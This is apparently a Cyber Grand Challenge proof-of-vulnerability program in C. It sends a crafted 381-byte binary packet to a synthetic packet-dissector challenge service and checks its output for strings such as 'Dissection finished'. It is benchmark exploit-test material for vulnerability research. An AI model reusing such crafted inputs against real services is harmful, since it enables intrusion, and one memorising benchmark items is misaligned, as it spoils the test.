#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x7d\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x65\x01\x00\x00\x5d\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x5d\x01\x00\x00"
         "\xe7\x9c\xdc\x8c\xc7\x90\xce\xbe\xc3\x40\x97\x08\xdc\x33\xf9\x77"
         "\xca\x28\xac\xb0\x16\x00\x00\x00\x2e\x98\x88\x9e\x49\x1a\x30\x11"
         "\xa6\x01\x00\x7b\xde\x30\x00\x28\xb6\xcd\x96\x76\x01\x00\xcf\xc4"
         "\x6f\xbf\x02\x4b\xc7\x88\xf1\x01\x00\x61\xff\x5a\x5f\xdd\xb4\xf4"
         "\x34\x24\x0d\x43\x1a\x63\x2b\x2d\x94\xf7\x2b\x82\x34\xab\xd9\x13"
         "\x1d\xce\xd0\x9f\xa0\x73\x45\xf7\x6a\xdc\x52\x9d\xf0\x52\xfe\xda"
         "\xd9\xd0\xe2\xdb\xc3\x2e\xd4\x1a\x63\x6e\x11\x4a\xe3\x42\x18\x2b"
         "\x79\x5e\x37\xdd\x15\x54\xe5\x67\xb9\x8e\x96\x9f\xdb\xe0\xfa\x61"
         "\x65\x31\x94\x7c\x61\xea\x29\x1e\x05\xa3\xdc\x8f\xae\x41\x7b\xa5"
         "\xed\xe7\x5a\xa8\x27\x22\x63\x2b\xfb\xed\xce\x5e\xca\xfd\x80\x82"
         "\xbf\xed\x4a\x8a\x08\x72\x92\xe4\x26\xa7\xad\xd2\xd8\xe3\x98\x7a"
         "\xf1\x07\x42\x00\x6b\xf9\xfe\x57\x83\x4a\x33\x7c\x71\x75\xab\x00"
         "\x2a\x0d\x9c\xc4\x42\x1b\xff\xaf\xc0\x52\xd7\x90\x51\x16\x79\x58"
         "\xa5\x75\x3e\x7a\xf7\xbb\xe4\x4a\x24\x6a\xb1\xcc\x84\x3a\x00\xe4"
         "\xc6\xf4\x6d\x4a\x21\xda\x2f\xa4\xae\x17\x8f\x89\xcf\x54\xdc\x0e"
         "\x27\xc2\x97\xb7\x5a\x92\x7d\x04\x80\xd9\x0a\xed\x33\x4d\x0a\xf9"
         "\x2e\xd9\xc3\xcd\xb9\x52\xa9\x6e\x09\x8c\xf7\x41\x28\x92\xe3\x57"
         "\x96\x4c\xd5\x06\xb2\x4b\x03\xeb\x43\x6d\x4c\xc3\xab\xb7\x3e\x30"
         "\x36\xc9\x90\x49\x6a\x83\x71\xb0\x65\x7e\x05\xff\x13\x03\xd8\xa8"
         "\xc9\x91\xb6\xfa\x05\x6f\x37\x6d\xa5\x00\x01\xb4\xce\x6d\x40\x77"
         "\x4e\x5d\xcf\x28\x01\x1b\x56\x27\x80\x75\x76\xda\x2e\xe8\xf0\x72"
         "\x77\x3c\x8e\x4b\xed\x69\x34\x06\x55\x0b\x39\x01\x88";
      static unsigned int write_00001_00000_len = 381;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaPantagruelistic
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x50\x61\x6e\x74\x61\x67"
         "\x72\x75\x65\x6c\x69\x73\x74\x69\x63";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
